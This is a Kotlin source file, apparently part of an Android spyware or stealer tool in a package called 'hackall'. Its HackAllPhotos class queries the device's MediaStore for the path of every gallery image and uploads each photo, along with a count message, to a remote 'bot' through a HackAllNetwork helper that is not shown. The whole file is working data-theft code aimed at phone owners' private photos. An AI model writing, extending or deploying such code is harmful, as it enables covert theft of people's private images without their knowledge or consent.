package cocomelonc.hackall.tools

import android.content.Context
import java.io.*
import android.provider.MediaStore
import android.widget.Toast

class HackAllPhotos (private val context: Context) {
    fun getPhotosFromGallery(): List<File> {
        val photosList = mutableListOf<File>()

        val cursor = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media.DATA),
            null,
            null,
            null
        )

        cursor?.use {
            val columnIndex = it.getColumnIndex(MediaStore.Images.Media.DATA)
            while (it.moveToNext()) {
                val photoPath = it.getString(columnIndex)
                photosList.add(File(photoPath))
            }
        }
        return photosList
    }

    fun sendPhotos() {
        val photosList = getPhotosFromGallery()

        if (photosList.isNotEmpty()) {
            // Send photos to bot (implement the sending logic here)
            HackAllNetwork(context).sendTextMessage("Sending ${photosList.size} photos to the bot.")
            for (photoPath in getPhotosFromGallery()) {
                HackAllNetwork(context).sendPhotoMessage(photoPath.toString())
            }
        } else {
            Toast.makeText(context, "No photos found", Toast.LENGTH_SHORT).show()
            HackAllNetwork(context).sendTextMessage("No photos found.")
        }
    }
}